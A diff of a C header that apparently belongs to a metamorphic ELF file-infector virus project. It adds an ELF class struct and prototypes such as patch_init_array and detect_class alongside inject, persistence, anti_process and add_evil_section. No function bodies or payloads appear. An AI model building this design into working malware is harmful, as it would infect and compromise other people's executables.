@@ -28,7 +28,15 @@
 #define FP_BLOCK_LEN (1 + FP_LEN + 1)
 #define SIGNATURE_TOTAL_LEN (SIGNATURE_BASIC_LEN + 1 + FP_LEN + 1 + 1)
 
-typedef enum {
+
+typedef struct 
+{	
+	int is32;
+	int is64;
+}	ElfClass;
+
+typedef enum 
+{
 	FT_UNKNOWN,
 	FT_ELF,
 	FT_PNG,
@@ -41,7 +49,8 @@ typedef enum {
 } file_type_t;
 
 
-typedef struct {
+typedef struct 
+{
 	file_type_t         type;
 	size_t              offset;
 	const unsigned char *magic;
@@ -56,9 +65,10 @@ int         	ready_infect(char *path);
 void        	inject(char *path);
 int         	anti_process(char *path);
 void        	persistence();
+int				patch_init_array(int fd, unsigned char *g_stub_code, size_t g_stub_size);
 off_t			vaddr_to_file_offset(int fd, uint64_t vaddr);
 off_t			find_signature_offset(int fd);
 void			metamorphe(size_t stub_size,unsigned char *stub, unsigned char seed);
 int				add_evil_section(char *path,unsigned char *stub, size_t stub_len);
-
+ElfClass		detect_class(int fd);
 #endif
